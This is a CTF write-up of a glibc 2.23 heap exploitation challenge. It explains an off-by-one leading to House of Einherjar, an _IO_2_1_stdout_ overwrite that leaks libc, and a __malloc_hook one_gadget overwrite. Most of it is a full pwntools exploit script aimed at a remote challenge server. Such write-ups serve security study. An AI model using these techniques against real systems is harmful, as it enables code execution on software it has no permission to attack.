# EldenRingFinal

~~标题依旧是没活~~  
*you need to learn some FILE IO knowlegde first*

## 文件属性

|属性  |值    |
|------|------|
|Arch  |x64   |
|RELRO |Full  |
|Canary|on    |
|NX    |on    |
|PIE   |off   |
|strip |no    |

## 解题思路

众所周知，`.bss`段上存在`stdout`, `stdin`, `stderr`三个指针指向glibc中的`IO_FILE`，
又知修改`_IO_2_1_stdout_`的`_IO_write_base`，将其覆写为小于`_IO_write_ptr`的值，
可以在执行`puts`等函数时输出从base到ptr的字节，从而在没有`show`的情况下泄露libc

由于没开PIE，我们可以先利用Off-by-One打 **House of Einherjar** 造成Heap Overlap，以进行 Arbitrary Alloc，
利用字节错位分配堆块到`stdout`地址低处，打 **House of Spirit** 伪造堆块并修改`stdout`，
使其指向`_IO_2_1_stdout_`低地址处字节错位  
然后依次将堆块分配到伪造的堆块、`_IO_2_1_stdout_`低地址处（在`_IO_2_1_stderr_`中），
然后覆写`_IO_2_1_stderr_`结构体直到覆写`_IO_2_1_stdout_`的`_flags`为`0xfbad1800`，
以及其`_IO_write_ptr`为`_IO_2_1_stdout_`的`_chain`的地址（指向`_IO_2_1_stdin_`），
这样，在`add_note`结束时运行`puts("success!")`的时候就会泄露出libc（即`_IO_2_1_stdin_`的地址）  
要注意的是远程地址有偏移，在修改`stdout`时，由于需要修改2个字节，因此要爆破1/16的概率

> 一开始我借`stdout`为跳板，改`stdin`为0(prev_size)，想打`stderr`，结果发现，`scanf`会用到`stdin`！
> 也就是在执行`scanf`的时候直接SIGSEGV了，于是我就倒着找，在`stdout`之前的只读段中找跳板（libc非0的最高字节），
> 由于malloc时不会写入数据，因此这么做不会报错

在leak了之后，恢复堆结构，再打 **House of Einherjar** ，分配到`&__malloc_hook - 0x23`的位置写OneGadget即可

## EXPLOIT

```python
from pwn import *
import inspect
context.terminal = ['tmux','splitw','-h']

def payload(lo:int):
    global sh
    if lo:
        sh = process('./eldering4')
        if lo & 2:
            gdb.attach(sh, gdbscript='p /x &_IO_2_1_stdout_')
    else:
        sh = remote('139.224.232.162', 31630)
    libc = ELF('/home/Rocket/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6')
    elf = ELF('./eldering4')

    def eofHandler():
        warn(f'eof detected! running line {inspect.stack()[2][2]}') # print the line currently running
        if sh.can_recv():
            info(str(sh.recv()))
        sh.close()
        return None

    def addPage():
        sh.sendlineafter(b'>', b'1')

    def delPage(page:int):
        sh.sendlineafter(b'>', b'2')
        sh.sendlineafter(b'page', str(page).encode())

    def addNote(page:int, size:int, content:bytes=b'\n') -> bytes:
        sh.sendlineafter(b'>', b'3')
        sh.sendlineafter(b'to?\n>', str(page).encode())
        sh.sendlineafter(b'size:\n>', str(size).encode())
        sh.sendafter(b'tent:\n>', content)
        try:
            ret = sh.recvuntil(b'success!', False, 1)
        except EOFError:
            return eofHandler()
        if not ret:
            return eofHandler()
        elif ret[:1] == b'\n': # sometimes there is a '\n', sometimes not
            ret = ret[1:]
        return ret

    def delNote(page:int, note:int):
        sh.sendlineafter(b'>', b'4')
        sh.sendlineafter(b'>', str(page).encode())
        sh.sendlineafter(b'>', str(note).encode())

    chunkHead = elf.symbols['stdout'] - 0x2b # byte misalignment
    wStdoutOffset = (libc.symbols['_IO_2_1_stdout_'] - 0x43) & 0xfff
    if lo & 4:
        bruteByte = int(input('input last WORD of &_IO_2_1_stdout_: 0x'), 16) & 0xf000
    else:
        bruteByte = 0x4000
    wStdoutOffset += bruteByte
    bStdoutChain = (libc.symbols['_IO_2_1_stdout_'] + 0x68) & 0xff

    # alloc some 0x31 chunks in case allocations of structs influence our work
    addNote(0, 0x20) # 1
    addNote(0, 0x20) # 2
    addNote(0, 0x20) # 3
    addNote(0, 0x20) # 4
    addNote(0, 0x20) # 5
    delNote(0, 1)
    delNote(0, 2)
    delNote(0, 3)
    delNote(0, 4)
    delNote(0, 5)

    # house of einherjar #1, alloc to stdout - 0x2b to modify stdout
    addNote(0, 0x88) # 1
    addNote(0, 0x68) # 2
    addNote(0, 0x88) # 3
    addNote(0, 0x8) # 4 guard chunk, preventing chunks from being merged into top chunk
    delNote(0, 1)                                       # release in advance
    delNote(0, 2)
    addNote(0, 0x68, b'0'*0x60 + p64(0x100) + p8(0x90)) # 5 zero out PREV_INUSE of next chunk
    delNote(0, 3)                                       # cause heap overlap
    delNote(0, 5)                                       # now chunk 5 is in unsorted bin and fastbin
    addNote(0, 0x98, b'0'*0x88 + p64(0x71) + p64(chunkHead)) # 5 mod chunk 5's fd in fastbin
    addNote(0, 0x68) # 6 chunk 5 in fastbin
    addNote(0, 0x68, b'\0'*0x3 + p64(0)*2 + p64(0x71) + p16(wStdoutOffset)) # 7 alloc below stdout, force a chunk and mod stdout, 1/16 chance
    delNote(0, 5)
    delNote(0, 6)                                       # restore heap layout (like line 80)

    # house of einherjar #2, alloc to stdout and mod _IO_write_base
    addNote(0, 0x98, b'0'*0x88 + p64(0x71) + p64(chunkHead + 0x1b)) # 8
    addNote(0, 0x68) # 9
    addNote(0, 0x68) # 10
    ret = addNote(0, 0x68, b'\0'*0x33 + p64(0xfbad1800) + p64(0)*3 + p8(bStdoutChain)) # 11
    if ret is None:
        return 0

    stdin = u64(ret[:6] + b'\0\0')
    libcBase = stdin - libc.symbols['_IO_2_1_stdin_']
    success(f'\x1b[33mleak libcBase: {hex(libcBase)}\x1b[0m')
    mallocHook = libcBase + libc.symbols['__malloc_hook']
    ogg = libcBase + 0xf0897

    # house of einherjar #3, alloc to __malloc_hook and write one gadget
    delNote(0, 9)
    delNote(0, 8) # restore heap layout
    addNote(0, 0x98, b'0'*0x88 + p64(0x71) + p64(mallocHook - 0x23)) # 12
    addNote(0, 0x68) # 13
    addNote(0, 0x68, b'\0'*0x13 + p64(ogg)) # 14
    addPage() # trigger mallocHook

    sh.clean()
    sh.interactive()
    return 1
```
